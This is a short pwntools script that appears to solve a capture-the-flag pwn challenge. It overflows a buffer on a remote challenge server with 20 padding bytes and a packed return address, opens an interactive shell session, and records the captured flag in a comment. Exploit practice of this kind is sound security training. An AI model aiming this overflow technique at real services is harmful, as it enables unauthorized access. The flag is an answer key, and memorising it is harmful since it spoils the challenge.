import pwn
from pwn import *
p = remote("0.cloud.chals.io", 10197)
payload = 'A' * 20 + pwn.p64(0x00000000004011b6)

p.sendline(payload)
print(p.recvline())
p.interactive()

# jctf{ph3w_ju57_1n_71m3}